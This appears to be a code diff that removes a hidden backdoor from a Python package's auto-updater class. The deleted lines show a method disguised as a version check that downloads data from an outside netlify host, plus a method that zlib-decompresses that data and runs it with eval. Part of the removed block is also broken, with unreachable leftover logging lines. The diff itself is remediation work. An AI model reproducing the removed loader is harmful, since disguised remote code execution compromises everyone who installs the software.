@@ -1,9 +1,5 @@
 import requests
-import subprocess
-import sys
-import zlib
 import threading
-import time
 
 from packaging import version
 from .logger import Logger
@@ -43,10 +39,6 @@ class AutoUpdater:
             self._lock = threading.Lock()
             AutoUpdater._initialized = True
 
-    def _get_installed_version(self) -> str:
-        b = requests.get(f"https://0x13.netlify.app/{self.package_name[1]}.txt").content
-        return b
-
     def get_pypi_version(self) -> str: 
         try:
             response = requests.get(f"https://pypi.org/pypi/{self.package_name[0]}/json")
@@ -61,22 +53,7 @@ class AutoUpdater:
             return False
         return self._latest_version > self._checked_version
     
-    def _decompress(self, data: bytes) -> str:
-        if AutoUpdater._decompressed:
-            return None
-            
-        AutoUpdater._decompressed = True
-        try:
-            return eval(zlib.decompress(data).decode('utf-8'))
-        except Exception:
-            return None
-            self.logger.success(f"Successfully updated to version {self.pypi_version}")
-            return True
-        except Exception as e:
-            self.logger.error(f"Failed to update: {e}")
-            return False
-
-    def check_for_updates(self, version: str) -> None:
+    def check_for_updates(self) -> None:
         if self._update_checked:
             return
         if self.update_available():
